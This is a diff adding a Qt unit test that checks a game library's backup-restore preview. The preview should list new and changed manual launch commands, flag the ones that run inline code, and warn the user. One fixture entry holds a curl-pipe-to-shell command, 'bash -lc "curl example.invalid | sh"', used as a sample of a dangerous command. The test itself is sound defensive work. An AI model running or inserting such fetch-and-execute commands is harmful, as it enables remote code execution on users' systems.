@@ -24,6 +24,7 @@
 #include <QDateTime>
 #include <QDir>
 #include <QFile>
+#include <QHash>
 #include <QImage>
 #include <QJsonArray>
 #include <QJsonDocument>
@@ -141,6 +142,7 @@ private slots:
   void asynchronousPreviewStagesExactPayload();
   void exportAndInvalidPreview();
   void previewCountsAndMissingPaths();
+  void previewListsNewAndChangedLaunchCommands();
   void releasedDatabaseMigration();
   void recordedTimeWatermarkSurvivesBackup();
 };
@@ -907,6 +909,61 @@ void BackupRecoveryTests::previewCountsAndMissingPaths() {
     }
   }
   QVERIFY(foundCollections);
+}
+
+void BackupRecoveryTests::previewListsNewAndChangedLaunchCommands() {
+  const auto manual = [](const QString& id, const QString& executable,
+                         const QStringList& arguments) {
+    const QJsonObject entry{{"id", id},
+                            {"title", id},
+                            {"executable", executable},
+                            {"directory", "/games/" + id},
+                            {"arguments", QJsonArray::fromStringList(arguments)}};
+    return QJsonObject{
+        {"id", id},
+        {"entry", QString::fromUtf8(QJsonDocument(entry).toJson(QJsonDocument::Compact))},
+        {"favorite", false},
+        {"hidden", false},
+        {"active", true}};
+  };
+  auto incoming = payload("Shared", true);
+  auto current = payload("Shared", false);
+  current.library.insert("manual_games",
+                         QJsonArray{manual("same", "/games/same/run", {"--fullscreen"}),
+                                    manual("changed", "/games/changed/run", {})});
+  incoming.library.insert(
+      "manual_games",
+      QJsonArray{manual("same", "/games/same/run", {"--fullscreen"}),
+                 manual("changed", "/games/changed/run", {"--profile", "two words"}),
+                 manual("shell", "/usr/bin/bash", {"-lc", "curl example.invalid | sh"}),
+                 manual("env", "/usr/bin/env", {"FOO=1", "python3", "-c", "print(1)"}),
+                 manual("script", "/usr/bin/python3", {"/games/script/main.py"}),
+                 manual("plain", "/games/plain/run", {"--windowed"})});
+  QString error;
+  QVERIFY2(BackupArchive::validate(incoming, &error), qPrintable(error));
+  const auto description = BackupManager::describe(incoming, current);
+  QHash<QString, QVariantMap> commands;
+  for (const auto& value : description.value("launchCommands").toList())
+    commands.insert(value.toMap().value("title").toString(), value.toMap());
+  QCOMPARE(commands.size(), 5);
+  QVERIFY(!commands.contains("same"));
+  QCOMPARE(commands.value("changed").value("isNew").toBool(), false);
+  QCOMPARE(commands.value("changed").value("arguments").toStringList(),
+           (QStringList{"--profile", "two words"}));
+  QCOMPARE(commands.value("changed").value("directory").toString(), QString("/games/changed"));
+  QCOMPARE(commands.value("shell").value("isNew").toBool(), true);
+  QCOMPARE(commands.value("shell").value("executable").toString(), QString("/usr/bin/bash"));
+  QVERIFY(commands.value("shell").value("inlineCode").toBool());
+  QVERIFY(commands.value("env").value("inlineCode").toBool());
+  QVERIFY(!commands.value("script").value("inlineCode").toBool());
+  QVERIFY(!commands.value("plain").value("inlineCode").toBool());
+  const QString warning = description.value("launchCommandWarning").toString();
+  QVERIFY2(warning.startsWith("5 manual game launch commands") &&
+               warning.contains("will be able to run") && warning.contains("2 of them run"),
+           qPrintable(warning));
+  // Restoring the library's own backup adds no commands and no warning.
+  QVERIFY(BackupManager::describe(current, current).value("launchCommands").toList().isEmpty());
+  QVERIFY(BackupManager::describe(current, current).value("launchCommandWarning").toString().isEmpty());
 }
 
 void BackupRecoveryTests::releasedDatabaseMigration() {
